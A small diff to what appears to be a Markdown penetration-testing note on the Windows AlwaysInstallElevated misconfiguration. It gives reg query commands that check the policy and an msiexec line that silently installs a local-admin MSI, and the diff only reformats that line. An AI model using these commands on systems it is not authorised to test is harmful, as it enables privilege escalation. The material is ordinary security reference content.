@@ -2,7 +2,10 @@
 Check if enabled:
 - `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` 
 - `reg query HKLM\software\policies\microsoft\windows\installer /v alwaysinstallelevated`
-- Exploit: `msiexec /quiet /qn /i newlocaladmin.msi`
+
+
+Exploit: 
+- `msiexec /quiet /qn /i newlocaladmin.msi`
 
 ### MSI File Purpose
 
